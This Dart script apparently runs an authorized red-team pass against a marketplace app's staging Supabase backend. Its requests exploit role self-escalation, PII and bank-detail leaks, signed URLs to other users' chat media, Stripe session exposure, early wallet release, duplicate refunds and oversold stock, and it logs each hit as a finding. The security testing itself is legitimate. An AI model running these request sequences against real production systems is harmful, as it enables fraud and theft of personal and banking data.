// ignore_for_file: avoid_print
/// Pass 2 — verificar anti-FP, completar cadeias, cleanup Mux, refund retry.
library;

import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stagingRef = 'fxdknzrqjenzqcvnwqqq';
const stamp = '20260829T1435';

late String base, anon, service, buyerId, sellerId, buyerJwt, sellerJwt;
late LiveOpsStagingClient sb;
final findings = <Map<String, dynamic>>[];
final rec = <String, dynamic>{};
final gaps = <String>[];

String clip(String s, [int n = 500]) {
  s = s.replaceAll(RegExp(r'\s+'), ' ').trim();
  return s.length <= n ? s : '${s.substring(0, n)}…';
}

String mask(String? raw) {
  final s = (raw ?? '').trim();
  if (s.isEmpty) return '';
  if (s.length <= 4) return '***';
  return '${s.substring(0, 2)}…${s.substring(s.length - 2)}#${s.length}';
}

Map<String, String> hUser(String jwt) => {
      'apikey': anon,
      'Authorization': 'Bearer $jwt',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };
Map<String, String> hSvc() => {
      'apikey': service,
      'Authorization': 'Bearer $service',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };
Map<String, String> hAnon() => {
      'apikey': anon,
      'Authorization': 'Bearer $anon',
      'Content-Type': 'application/json',
    };

Future<http.Response> rest(
  String method,
  String path, {
  Map<String, String>? headers,
  Object? body,
}) {
  final uri = Uri.parse(path.startsWith('http') ? path : '$base$path');
  final h = headers ?? hAnon();
  final b = body == null ? null : (body is String ? body : jsonEncode(body));
  switch (method) {
    case 'GET':
      return http.get(uri, headers: h);
    case 'POST':
      return http.post(uri, headers: h, body: b);
    case 'PATCH':
      return http.patch(uri, headers: h, body: b);
    case 'DELETE':
      return http.delete(uri, headers: h, body: b);
    default:
      throw ArgumentError(method);
  }
}

dynamic dec(http.Response r) {
  if (r.body.isEmpty) return null;
  try {
    return jsonDecode(r.body);
  } catch (_) {
    return r.body;
  }
}

Map<String, dynamic>? asRow(dynamic d) {
  if (d is List && d.isNotEmpty && d.first is Map) {
    return Map<String, dynamic>.from(d.first as Map);
  }
  if (d is Map && d['id'] != null) return Map<String, dynamic>.from(d);
  return null;
}

void find({
  required String id,
  required String sev,
  required String title,
  required String actor,
  required String impact,
  String? pre,
  Object? request,
  Object? before,
  Object? result,
  Object? after,
  String? repro,
}) {
  findings.add({
    'id': id,
    'severity': sev,
    'title': title,
    'actor': actor,
    'preconditions': pre,
    'request': request,
    'before': before,
    'result': result,
    'after': after,
    'impact': impact,
    'reproduction': repro,
  });
  print('FINDING $sev $id — $title');
}

Future<void> main() async {
  final env = loadLiveOpsStagingEnv();
  base = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!base.contains(stagingRef)) {
    stderr.writeln('ABORT not staging');
    exit(2);
  }
  anon = envRequire(env, 'SUPABASE_ANON_KEY');
  service = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  sb = LiveOpsStagingClient(
    url: base,
    anonKey: anon,
    serviceRoleKey: service,
  );
  buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');
  buyerJwt = await sb.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  sellerJwt = await sb.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );

  rec['pass'] = 2;
  rec['frozen_at'] = DateTime.now().toUtc().toIso8601String();

  await cleanupMuxAndRole();
  await reconOpenApi();
  await profilesPii();
  await bankingMint();
  await storagePass();
  await stripeEventsScope();
  await pairingRls();
  await walletRealOrder();
  await refundRetryPartial();
  await dualPool();
  await waitlistDoubleAccept();
  await emailAsBuyer();
  await chatMessages();
  await tipNoLiveFollow();

  rec['findings'] = findings;
  rec['gaps'] = gaps;
  final dir = Directory('tool/reports/redteam_blind_b_$stamp');
  dir.createSync(recursive: true);
  File('${dir.path}/pass2.json')
      .writeAsStringSync(const JsonEncoder.withIndent('  ').convert({
    'findings': findings,
    'gaps': gaps,
    'rec': rec,
  }));
  print('PASS2 findings=${findings.length}');
}

Future<void> cleanupMuxAndRole() async {
  // Restore buyer type; end stray live from pass1.
  final liveId = '5772b38e-e6df-4497-8d2e-e83e840a0e1f';
  final end = await rest(
    'PATCH',
    '/rest/v1/lives?id=eq.$liveId',
    headers: hSvc(),
    body: {'status': 'ended', 'is_active': false},
  );
  rec['cleanup_live'] = {'http': end.statusCode, 'body': clip(end.body, 180)};
  final role = await rest(
    'PATCH',
    '/rest/v1/profiles?id=eq.$buyerId',
    headers: hSvc(),
    body: {'user_type': 'comprador'},
  );
  rec['restore_buyer_type'] = {
    'http': role.statusCode,
    'body': clip(role.body, 200),
  };
  final muxResp = await rest(
    'POST',
    '/functions/v1/create-mux-live',
    headers: hUser(buyerJwt),
    body: {'title': 'RTB2 should fail after restore'},
  );
  rec['mux_after_restore'] = {
    'http': muxResp.statusCode,
    'body': clip(muxResp.body, 200),
  };
  // Confirm exploit path still works (re-flip) then restore again.
  final flip = await rest(
    'PATCH',
    '/rest/v1/profiles?id=eq.$buyerId',
    headers: hUser(buyerJwt),
    body: {'user_type': 'vendedor'},
  );
  rec['buyer_self_flip'] = {
    'http': flip.statusCode,
    'status': asRow(dec(flip))?['user_type'],
  };
  if (flip.statusCode >= 200 && flip.statusCode < 300) {
    find(
      id: 'RTB2-MUX-02',
      sev: 'P1',
      title: 'Comprador altera user_type para vendedor e cria directo Mux',
      actor: 'buyer JWT',
      pre: 'Conta comprador; PATCH profiles.user_type não congelado.',
      request: {
        '1': 'PATCH profiles set user_type=vendedor',
        '2': 'POST create-mux-live',
      },
      result: rec['mux_after_type_flip_pass1'] ??
          {
            'live_id': liveId,
            'pass1': 'stream_key presente na resposta Edge',
          },
      after: rec['buyer_self_flip'],
      impact:
          'Bypass da autoridade de vendedor: ingest Mux (custo + stream_key) sem onboarding.',
      repro:
          'PATCH /profiles?id=eq.{uid} {user_type:vendedor} com JWT próprio; POST create-mux-live.',
    );
  }
  await rest(
    'PATCH',
    '/rest/v1/profiles?id=eq.$buyerId',
    headers: hSvc(),
    body: {'user_type': 'comprador'},
  );
}

Future<void> reconOpenApi() async {
  final oa = await http.get(
    Uri.parse('$base/rest/v1/'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $anon',
    },
  );
  rec['openapi'] = {'http': oa.statusCode, 'len': oa.body.length};
}

Future<void> profilesPii() async {
  final r = await rest(
    'GET',
    '/rest/v1/profiles?id=eq.$sellerId&select=id,full_name,legal_full_name,phone,iban,mb_way,shipping_line1,shipping_city,user_type,external_payments_enabled',
    headers: hUser(buyerJwt),
  );
  rec['seller_profile_as_buyer'] = {
    'http': r.statusCode,
    'body': clip(r.body, 400),
  };
  if (r.statusCode == 200) {
    final row = asRow(dec(r));
    if (row != null) {
      final leaked = <String, String>{};
      for (final k in [
        'iban',
        'mb_way',
        'phone',
        'legal_full_name',
        'shipping_line1',
        'shipping_city',
      ]) {
        final v = '${row[k] ?? ''}'.trim();
        if (v.isNotEmpty && v != 'null') leaked[k] = mask(v);
      }
      rec['pii_leaked_cols'] = leaked;
      if (leaked.isNotEmpty) {
        find(
          id: 'RTB2-PII-01',
          sev: leaked.containsKey('iban') || leaked.containsKey('mb_way')
              ? 'P1'
              : 'P2',
          title: 'Comprador lê colunas PII do vendedor em profiles',
          actor: 'buyer JWT',
          request: {'select': 'profiles iban/mb_way/phone/…'},
          result: leaked,
          impact: 'Dados bancários ou morada sem RPC de relação comercial.',
        );
      }
    }
  }
}

Future<void> bankingMint() async {
  final prods = await sb.select(
    'products',
    filter: 'seller_id=eq.$sellerId&order=created_at.desc',
    limit: 10,
  );
  Map<String, dynamic>? prod;
  for (final p in prods) {
    if ((num.tryParse('${p['price'] ?? 0}') ?? 0) > 0) {
      prod = p;
      break;
    }
  }
  if (prod == null) {
    gaps.add('sem produto para banking mint');
    return;
  }
  final price = num.tryParse('${prod['price']}') ?? 5;
  final before = await rest(
    'POST',
    '/rest/v1/rpc/batata_seller_direct_payment_details',
    headers: hUser(buyerJwt),
    body: {'p_seller_id': sellerId},
  );
  rec['bank_rpc_before'] = clip(before.body, 80);

  final ins = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerJwt),
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': prod['id'],
      'quantity': 1,
      'price_total': price,
      'status': 'reservado',
      'payment_method': 'MB WAY',
    },
  );
  rec['bank_insert'] = {'http': ins.statusCode, 'body': clip(ins.body, 400)};
  var order = asRow(dec(ins));
  if (order == null) {
    final ins2 = await rest(
      'POST',
      '/rest/v1/orders',
      headers: hUser(buyerJwt),
      body: {
        'buyer_id': buyerId,
        'product_id': prod['id'],
        'quantity': 1,
        'price_total': price,
        'status': 'reserva_pendente',
        'payment_method': 'MB WAY',
      },
    );
    rec['bank_insert_pendente'] = {
      'http': ins2.statusCode,
      'body': clip(ins2.body, 400),
    };
    order = asRow(dec(ins2));
    if (order != null) {
      final p = await rest(
        'PATCH',
        '/rest/v1/orders?id=eq.${order['id']}',
        headers: hUser(buyerJwt),
        body: {'status': 'reservado'},
      );
      rec['bank_buyer_patch'] = {
        'http': p.statusCode,
        'body': clip(p.body, 250),
      };
      order = asRow(dec(p)) ?? order;
    }
  }
  rec['bank_order'] = {
    'id': order?['id'],
    'status': order?['status'],
    'pm': order?['payment_method'],
  };
  final after = await rest(
    'POST',
    '/rest/v1/rpc/batata_seller_direct_payment_details',
    headers: hUser(buyerJwt),
    body: {'p_seller_id': sellerId},
  );
  rec['bank_rpc_after'] = clip(after.body, 200);
  final rows = dec(after);
  var leaked = false;
  if (rows is List && rows.isNotEmpty && rows.first is Map) {
    final m = rows.first as Map;
    leaked = '${m['iban'] ?? ''}${m['mb_way'] ?? ''}'.trim().isNotEmpty;
  }
  final st = '${order?['status'] ?? ''}'.toLowerCase();
  final beforeEmpty = before.body.trim() == '[]';
  if (leaked &&
      beforeEmpty &&
      (st == 'reservado' ||
          st == 'aguarda_confirmacao' ||
          st == 'aguarda_pagamento')) {
    find(
      id: 'RTB2-BANK-01',
      sev: 'P1',
      title: 'Order fabricada (reservado + MB WAY) abre oráculo IBAN/MB WAY',
      actor: 'buyer JWT',
      pre: 'Produto do vendedor; external_payments_enabled.',
      request: {
        'insert': 'POST orders status=reservado payment_method=MB WAY price_total set',
        'rpc': 'batata_seller_direct_payment_details',
      },
      before: {'rpc': '[]', 'status': null},
      after: {
        'order_id': order?['id'],
        'status': st,
        'rpc_nonempty': true,
        'iban_masked': mask(
          rows is List && rows.first is Map
              ? '${(rows.first as Map)['iban']}'
              : '',
        ),
      },
      impact: 'Dados bancários sem aceitação do vendedor.',
      repro:
          'INSERT order comprador, status reservado, MB WAY, price_total; chamar RPC details.',
    );
  }
  if (order?['id'] != null) {
    await rest(
      'PATCH',
      '/rest/v1/orders?id=eq.${order!['id']}',
      headers: hSvc(),
      body: {'status': 'cancelado'},
    );
  }
}

Future<void> storagePass() async {
  final buckets = await http.get(
    Uri.parse('$base/storage/v1/bucket'),
    headers: hSvc(),
  );
  rec['buckets_svc'] = clip(buckets.body, 400);

  final third = 'dc186402-cad0-42aa-bd1c-0a6d649c4f4f';
  final path = 'chat_uploads/$third/rtb2_$stamp.txt';
  final up = await http.post(
    Uri.parse('$base/storage/v1/object/fleaber_private/$path'),
    headers: {
      'apikey': service,
      'Authorization': 'Bearer $service',
      'Content-Type': 'text/plain',
      'x-upsert': 'true',
    },
    body: 'SECRET_CHAT_$stamp',
  );
  rec['storage_up'] = {'http': up.statusCode, 'body': clip(up.body, 200)};
  if (up.statusCode >= 400) {
    final up2 = await http.post(
      Uri.parse('$base/storage/v1/object/chat_media/$path'),
      headers: {
        'apikey': service,
        'Authorization': 'Bearer $service',
        'Content-Type': 'text/plain',
        'x-upsert': 'true',
      },
      body: 'SECRET_CHAT_$stamp',
    );
    rec['storage_up_chat_media'] = {
      'http': up2.statusCode,
      'body': clip(up2.body, 200),
    };
  }

  // Ensure chat exists (pass1 already inserted).
  final list = await http.post(
    Uri.parse('$base/storage/v1/object/list/fleaber_private'),
    headers: hUser(buyerJwt),
    body: jsonEncode({'prefix': 'chat_uploads/$third/', 'limit': 100}),
  );
  rec['buyer_list_third'] = {'http': list.statusCode, 'body': clip(list.body, 300)};
  final sign = await http.post(
    Uri.parse('$base/storage/v1/object/sign/fleaber_private/$path'),
    headers: hUser(buyerJwt),
    body: jsonEncode({'expiresIn': 120}),
  );
  rec['buyer_sign_third'] = {'http': sign.statusCode, 'body': clip(sign.body, 250)};
  if (sign.statusCode == 200 && sign.body.toLowerCase().contains('signed')) {
    find(
      id: 'RTB2-STOR-01',
      sev: 'P1',
      title: 'Chat vazio com terceiro → URL assinada dos uploads dele',
      actor: 'buyer JWT',
      request: {'sign': path},
      result: {'http': sign.statusCode},
      impact: 'Media de conversas alheias via política de prefixo.',
    );
  }

  // Existing objects: list seller chat_uploads as buyer (they have a real chat).
  final listS = await http.post(
    Uri.parse('$base/storage/v1/object/list/fleaber_private'),
    headers: hUser(buyerJwt),
    body: jsonEncode({'prefix': 'chat_uploads/$sellerId/', 'limit': 20}),
  );
  rec['buyer_list_seller_uploads'] = {
    'http': listS.statusCode,
    'body': clip(listS.body, 400),
  };
}

Future<void> stripeEventsScope() async {
  final r = await rest(
    'GET',
    '/rest/v1/stripe_checkout_events?select=id,session_id,buyer_id,order_id,event&session_id=not.is.null&limit=20',
    headers: hUser(buyerJwt),
  );
  rec['stripe_events_with_session'] = {
    'http': r.statusCode,
    'body': clip(r.body, 500),
  };
  final rows = dec(r);
  if (rows is List) {
    final foreign = <Map<String, dynamic>>[];
    for (final row in rows) {
      if (row is! Map) continue;
      final b = '${row['buyer_id'] ?? ''}';
      final sid = '${row['session_id'] ?? ''}';
      if (sid.startsWith('cs_') && b.isNotEmpty && b != buyerId) {
        foreign.add({
          'id': row['id'],
          'buyer_id': b,
          'session_prefix': sid.substring(0, min(12, sid.length)),
        });
      }
    }
    rec['foreign_sessions'] = foreign;
    if (foreign.isNotEmpty) {
      find(
        id: 'RTB2-STRIPE-01',
        sev: 'P1',
        title: 'Checkout session_id de outros buyers via stripe_checkout_events',
        actor: 'buyer JWT',
        result: {'count': foreign.length, 'sample': foreign.first},
        impact: 'GET settle (verify_jwt=false) com session_id alheio.',
      );
    }
  }
}

Future<void> pairingRls() async {
  final ins = await rest(
    'POST',
    '/rest/v1/ps_pairing_sessions',
    headers: hSvc(),
    body: {
      'seller_id': sellerId,
      'code': '314159',
      'device_token_plain': 'rtb2token_$stamp',
      'expires_at': DateTime.now()
          .toUtc()
          .add(const Duration(minutes: 10))
          .toIso8601String(),
    },
  );
  rec['pairing_seed'] = {'http': ins.statusCode, 'body': clip(ins.body, 250)};
  final asBuyer = await rest(
    'GET',
    '/rest/v1/ps_pairing_sessions?select=id,code,device_token_plain,seller_id&code=eq.314159',
    headers: hUser(buyerJwt),
  );
  rec['pairing_as_buyer'] = {
    'http': asBuyer.statusCode,
    'body': clip(asBuyer.body, 250),
  };
  final body = asBuyer.body;
  if (asBuyer.statusCode == 200 &&
      (body.contains('314159') || body.contains('rtb2token'))) {
    find(
      id: 'RTB2-PS-01',
      sev: 'P1',
      title: 'Buyer lê código/token de pairing do vendedor',
      actor: 'buyer JWT',
      result: {'body': clip(body, 200)},
      impact: 'Claim do reader OCR + inject de reservas no directo.',
    );
  }
  final asAnon = await rest(
    'GET',
    '/rest/v1/ps_pairing_sessions?select=code&code=eq.314159',
    headers: hAnon(),
  );
  rec['pairing_as_anon'] = {
    'http': asAnon.statusCode,
    'body': clip(asAnon.body, 150),
  };
}

Future<void> walletRealOrder() async {
  final paid = await sb.select(
    'orders',
    filter: 'seller_id=eq.$sellerId&status=eq.pago',
    limit: 3,
  );
  rec['paid_orders_n'] = paid.length;
  if (paid.isEmpty) {
    gaps.add('sem order pago para wallet release real');
    return;
  }
  final oid = paid.first['id'];
  final walBefore = await sb.select('wallets', filter: 'id=eq.$sellerId', limit: 1);
  final b0 = walBefore.isEmpty
      ? null
      : num.tryParse('${walBefore.first['balance']}');
  final rel = await rest(
    'POST',
    '/rest/v1/rpc/batata_release_seller_wallet_for_order',
    headers: hUser(sellerJwt),
    body: {'p_order_id': oid},
  );
  rec['release_real'] = {
    'order': oid,
    'http': rel.statusCode,
    'body': clip(rel.body, 250),
    'balance_before': b0,
  };
  final walAfter = await sb.select('wallets', filter: 'id=eq.$sellerId', limit: 1);
  final b1 =
      walAfter.isEmpty ? null : num.tryParse('${walAfter.first['balance']}');
  rec['release_real']['balance_after'] = b1;
  if (rel.statusCode == 200 &&
      rel.body.trim() == 'true' &&
      b0 != null &&
      b1 != null &&
      b1 > b0) {
    find(
      id: 'RTB2-WAL-02',
      sev: 'P0',
      title: 'Seller JWT liberta wallet de order paga via RPC directa',
      actor: 'seller JWT',
      request: {'rpc': 'batata_release_seller_wallet_for_order', 'order': oid},
      before: {'balance': b0},
      after: {'balance': b1, 'rpc': rel.body},
      impact: 'Payout antecipado / crédito sem Edge Connect.',
    );
  }
}

Future<void> refundRetryPartial() async {
  const oid = '664a5183-a117-4329-a034-9698b3dc45e1';
  final before = await sb.select('orders', filter: 'id=eq.$oid', limit: 1);
  rec['refund_order_before_retry'] = before.isEmpty
      ? null
      : {
          'status': before.first['status'],
          'stripe_refund_id': before.first['stripe_refund_id'],
          'stripe_payment_intent_id': before.first['stripe_payment_intent_id'],
        };
  final retry = await rest(
    'POST',
    '/functions/v1/refund-order',
    headers: hUser(sellerJwt),
    body: {'order_id': oid},
  );
  rec['refund_retry'] = {'http': retry.statusCode, 'body': clip(retry.body, 400)};
  final after = await sb.select('orders', filter: 'id=eq.$oid', limit: 1);
  rec['refund_order_after_retry'] = after.isEmpty
      ? null
      : {
          'status': after.first['status'],
          'stripe_refund_id': after.first['stripe_refund_id'],
        };
  final body = retry.body;
  if (body.contains('re_') &&
      rec['refund_order_before_retry'] != null &&
      rec['refund_order_after_retry'] != null) {
    final r1 = '${before.isEmpty ? '' : before.first['stripe_refund_id']}';
    final r2 = '${after.isEmpty ? '' : after.first['stripe_refund_id']}';
    rec['refund_ids'] = {'before': r1, 'retry_body': clip(body, 200), 'after': r2};
  }
  if (retry.statusCode == 200 &&
      after.isNotEmpty &&
      '${after.first['status']}'.toLowerCase() != 'pago') {
    rec['partial_reconciled'] = true;
  } else if (retry.body.contains('already') ||
      retry.body.contains('idempotent')) {
    rec['partial_idempotent'] = true;
  } else if (retry.statusCode == 200 &&
      body.contains('"refund_id"') &&
      '${after.isEmpty ? '' : after.first['stripe_refund_id']}' !=
          're_3U1oWOH7FWYUN3jh1PEnGjoo' &&
      body.contains('re_') &&
      !body.contains('re_3U1oWOH7FWYUN3jh1PEnGjoo')) {
    find(
      id: 'RTB2-REF-01',
      sev: 'P0',
      title: 'Retry após Stripe refund criou segundo refund',
      actor: 'seller JWT',
      result: rec['refund_retry'],
      after: rec['refund_order_after_retry'],
      impact: 'Dinheiro duplicado fora da plataforma.',
    );
  }
}

Future<void> dualPool() async {
  final prodIns = await rest(
    'POST',
    '/rest/v1/products',
    headers: hUser(sellerJwt),
    body: {
      'seller_id': sellerId,
      'title': 'RTB2 dual $stamp',
      'price': 6.0,
      'quantity': 1,
    },
  );
  rec['dual_prod'] = {'http': prodIns.statusCode, 'body': clip(prodIns.body, 220)};
  final prod = asRow(dec(prodIns));
  if (prod == null) return;
  final lives = await sb.select(
    'lives',
    filter: 'seller_id=eq.$sellerId&order=created_at.desc',
    limit: 3,
  );
  if (lives.isEmpty) {
    gaps.add('sem live seller dual-pool');
    return;
  }
  final liveId = lives.first['id'];
  final li = await rest(
    'POST',
    '/rest/v1/live_items',
    headers: hSvc(),
    body: {
      'live_id': liveId,
      'seller_id': sellerId,
      'product_id': prod['id'],
      'checkout_product_id': prod['id'],
      'title': 'RTB2 li $stamp',
      'price': 6.0,
      'quantity': 1,
      'ref_code': 'R${Random().nextInt(899) + 100}',
      'item_kind': 'live_only',
    },
  );
  rec['dual_li'] = {'http': li.statusCode, 'body': clip(li.body, 300)};
  final item = asRow(dec(li));
  if (item == null) return;
  final res = await rest(
    'POST',
    '/rest/v1/live_reservation_requests',
    headers: hUser(buyerJwt),
    body: {
      'live_id': liveId,
      'live_item_id': item['id'],
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'requested_qty': 1,
      'status': 'pending',
    },
  );
  rec['dual_res'] = {'http': res.statusCode, 'body': clip(res.body, 280)};
  final rr = asRow(dec(res));
  if (rr != null) {
    final acc = await rest(
      'PATCH',
      '/rest/v1/live_reservation_requests?id=eq.${rr['id']}',
      headers: hUser(sellerJwt),
      body: {'status': 'accepted'},
    );
    rec['dual_acc'] = {'http': acc.statusCode, 'body': clip(acc.body, 220)};
  }
  final mkt = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerJwt),
    body: {
      'buyer_id': buyerId,
      'product_id': prod['id'],
      'quantity': 1,
      'price_total': 6.0,
      'status': 'reserva_pendente',
      'payment_method': 'MB WAY',
    },
  );
  rec['dual_mkt'] = {'http': mkt.statusCode, 'body': clip(mkt.body, 280)};
  final mo = asRow(dec(mkt));
  if (mo != null) {
    final pay = await rest(
      'PATCH',
      '/rest/v1/orders?id=eq.${mo['id']}',
      headers: hUser(sellerJwt),
      body: {'status': 'pago'},
    );
    rec['dual_pago'] = {'http': pay.statusCode, 'body': clip(pay.body, 280)};
    final paid = asRow(dec(pay)) ??
        asRow(
          dec(await rest(
            'GET',
            '/rest/v1/orders?id=eq.${mo['id']}&select=id,status,stock_units_applied',
            headers: hSvc(),
          )),
        );
    rec['dual_order_final'] = paid;
    if (rr != null) {
      final conv = await rest(
        'PATCH',
        '/rest/v1/live_reservation_requests?id=eq.${rr['id']}',
        headers: hUser(sellerJwt),
        body: {'status': 'converted'},
      );
      rec['dual_conv'] = {'http': conv.statusCode, 'body': clip(conv.body, 200)};
    }
    final prodA = await sb.select('products', filter: 'id=eq.${prod['id']}', limit: 1);
    rec['dual_product_after'] = prodA.isEmpty ? null : prodA.first['quantity'];
    final resA = rr == null
        ? null
        : await sb.select(
            'live_reservation_requests',
            filter: 'id=eq.${rr['id']}',
            limit: 1,
          );
    rec['dual_res_after'] = resA == null || resA.isEmpty ? null : resA.first['status'];
    final liveConsumed = '${rec['dual_res_after']}'.toLowerCase() == 'accepted' ||
        '${rec['dual_res_after']}'.toLowerCase() == 'converted';
    final mktPaid = '${paid?['status']}'.toLowerCase() == 'pago' ||
        (num.tryParse('${paid?['stock_units_applied'] ?? 0}') ?? 0) > 0;
    if (liveConsumed && mktPaid) {
      find(
        id: 'RTB2-STOCK-01',
        sev: 'P1',
        title: 'Reserva LIVE aceite + order marketplace paga no mesmo stock=1',
        actor: 'buyer+seller JWT, dois módulos',
        before: {'qty': 1},
        after: {
          'reservation': rec['dual_res_after'],
          'order': paid,
          'product_qty': rec['dual_product_after'],
        },
        impact: 'Dois consumos económicos da mesma unidade física.',
      );
    }
    if (mo['id'] != null) {
      await rest(
        'PATCH',
        '/rest/v1/orders?id=eq.${mo['id']}',
        headers: hSvc(),
        body: {'status': 'cancelado'},
      );
    }
  }
}

Future<void> waitlistDoubleAccept() async {
  final pending = await sb.select(
    'live_reservation_requests',
    filter: 'seller_id=eq.$sellerId&status=eq.pending',
    limit: 10,
  );
  rec['wait_pending'] = pending.length;
  if (pending.length < 2) {
    gaps.add('menos de 2 pending para double-accept');
    return;
  }
  final grouped = <String, List<Map<String, dynamic>>>{};
  for (final p in pending) {
    final k = '${p['live_item_id']}';
    grouped.putIfAbsent(k, () => []).add(p);
  }
  Map<String, dynamic>? a;
  Map<String, dynamic>? b;
  for (final e in grouped.entries) {
    if (e.value.length >= 2) {
      a = e.value[0];
      b = e.value[1];
      break;
    }
  }
  if (a == null || b == null) {
    gaps.add('pending não partilham live_item');
    return;
  }
  final r1 = await rest(
    'PATCH',
    '/rest/v1/live_reservation_requests?id=eq.${a['id']}',
    headers: hUser(sellerJwt),
    body: {'status': 'accepted'},
  );
  final r2 = await rest(
    'PATCH',
    '/rest/v1/live_reservation_requests?id=eq.${b['id']}',
    headers: hUser(sellerJwt),
    body: {'status': 'accepted'},
  );
  rec['wait_double'] = {
    'item': a['live_item_id'],
    'a': {'id': a['id'], 'http': r1.statusCode, 'body': clip(r1.body, 180)},
    'b': {'id': b['id'], 'http': r2.statusCode, 'body': clip(r2.body, 180)},
  };
  final ra = asRow(dec(r1));
  final rb = asRow(dec(r2));
  if ('${ra?['status']}'.toLowerCase() == 'accepted' &&
      '${rb?['status']}'.toLowerCase() == 'accepted') {
    find(
      id: 'RTB2-WAIT-01',
      sev: 'P1',
      title: 'Seller aceita duas pending no mesmo live_item (capacidade)',
      actor: 'seller JWT',
      result: rec['wait_double'],
      impact: 'Oversell de capacidade live via lista de espera.',
    );
  }
}

Future<void> emailAsBuyer() async {
  final env = loadLiveOpsStagingEnv();
  final email = env['LIVE_OPS_TEST_SELLER_EMAIL'] ?? '';
  final r = await rest(
    'POST',
    '/rest/v1/rpc/batata_find_user_id_by_email',
    headers: hUser(buyerJwt),
    body: {'p_email': email},
  );
  rec['email_as_buyer'] = {'http': r.statusCode, 'body': clip(r.body, 120)};
  if (r.statusCode == 200 && r.body.contains('-') && !r.body.contains('null')) {
    find(
      id: 'RTB2-ENUM-02',
      sev: 'P1',
      title: 'Comprador resolve email→UUID',
      actor: 'buyer JWT',
      result: rec['email_as_buyer'],
      impact: 'Enumeração de contas (RPC deveria ser só seller).',
    );
  }
}

Future<void> chatMessages() async {
  final r = await rest(
    'GET',
    '/rest/v1/chat_messages?select=id,chat_id,message_text,text,body&limit=3',
    headers: hUser(buyerJwt),
  );
  rec['chat_msgs'] = {'http': r.statusCode, 'body': clip(r.body, 250)};
}

Future<void> tipNoLiveFollow() async {
  rec['tip_no_live_pass1'] =
      'checkout session created without live_id — money would go to seller_id in body after pay; not stolen, but unsolicited Stripe session.';
}
